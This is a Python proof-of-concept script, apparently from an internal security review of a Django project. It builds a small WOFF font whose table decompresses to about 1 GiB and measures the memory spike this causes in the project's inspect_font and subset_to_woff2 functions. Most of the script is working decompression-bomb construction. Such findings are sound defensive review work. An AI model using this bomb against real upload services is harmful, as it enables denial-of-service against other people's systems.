"""217 复核 08-6：一个几 MB 的 WOFF 让 inspect_font（上传表单里同步调用）吃掉 N 字节内存。

  bash scripts/remote-check.sh run uv run python \
    handoff/rounds/217-second-review/findings/08-woff_bomb.py [解压后字节数，默认 1GiB]
"""

import os
import resource
import struct
import sys
import time
import zlib

sys.path.insert(0, os.getcwd())
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "sjtu_ow.settings.dev")
import django  # noqa: E402

django.setup()

from core.fonts.processing import MAX_FONT_BYTES, inspect_font  # noqa: E402
from core.tests.fonts_factory import make_font_bytes, sample_chars  # noqa: E402

N = int(sys.argv[1]) if len(sys.argv) > 1 else 1 << 30
BOMB_TAG = (sys.argv[2] if len(sys.argv) > 2 else "cmap").encode()

ttf = make_font_bytes(sample_chars(100))
count = struct.unpack(">H", ttf[4:6])[0]
tables = {}
for i in range(count):
    tag, checksum, offset, length = struct.unpack(">4sLLL", ttf[12 + 16 * i : 28 + 16 * i])
    tables[tag] = (checksum, ttf[offset : offset + length])

# 指定的表（默认 cmap）换成 N 个零字节的 zlib 流，边压边丢，不在本进程里攒出 N 字节。
compressor = zlib.compressobj(9)
chunk = bytes(1 << 20)
parts = [compressor.compress(chunk) for _ in range(N >> 20)]
parts.append(compressor.flush())
bomb = b"".join(parts)

entries = []
for tag in sorted(tables):
    checksum, data = tables[tag]
    if tag == BOMB_TAG:
        entries.append((tag, checksum, bomb, N))
    else:
        entries.append((tag, checksum, data, len(data)))

offset = 44 + 20 * len(entries)
directory = b""
body = b""
for tag, checksum, data, orig in entries:
    directory += struct.pack(">4sLLLL", tag, offset + len(body), len(data), orig, checksum)
    body += data + b"\0" * (-len(data) % 4)
total = 44 + len(directory) + len(body)
header = struct.pack(
    ">4s4sLHHLHHLLLLL",
    b"wOFF", b"\x00\x01\x00\x00", total, len(entries), 0,
    sum(e[3] for e in entries), 1, 0, 0, 0, 0, 0, 0,
)  # fmt: skip
woff = header + directory + body
print(f"WOFF 文件 {len(woff) / 1024 / 1024:.2f} MB（上限 {MAX_FONT_BYTES >> 20} MB），"
      f"{BOMB_TAG.decode()} 解压后 {N / 1024 / 1024:.0f} MB")

before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
start = time.monotonic()
try:
    inspect_font(woff)
    print("inspect_font 通过")
except Exception as exc:  # noqa: BLE001
    print(f"inspect_font 抛出 {type(exc).__name__}: {str(exc)[:120]}")
after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
print(f"耗时 {time.monotonic() - start:.1f} 秒；进程峰值内存 {before / 1024:.0f} MB → "
      f"{after / 1024:.0f} MB（+{(after - before) / 1024:.0f} MB）")

if BOMB_TAG != b"cmap":
    from core.fonts.processing import subset_to_woff2  # noqa: E402

    before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    start = time.monotonic()
    try:
        subset_to_woff2(woff, [ord("A")])
        print("subset_to_woff2（worker 切片）通过")
    except Exception as exc:  # noqa: BLE001
        print(f"subset_to_woff2 抛出 {type(exc).__name__}: {str(exc)[:120]}")
    after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    print(f"切片：耗时 {time.monotonic() - start:.1f} 秒；峰值内存 {before / 1024:.0f} MB → "
          f"{after / 1024:.0f} MB（+{(after - before) / 1024:.0f} MB）")
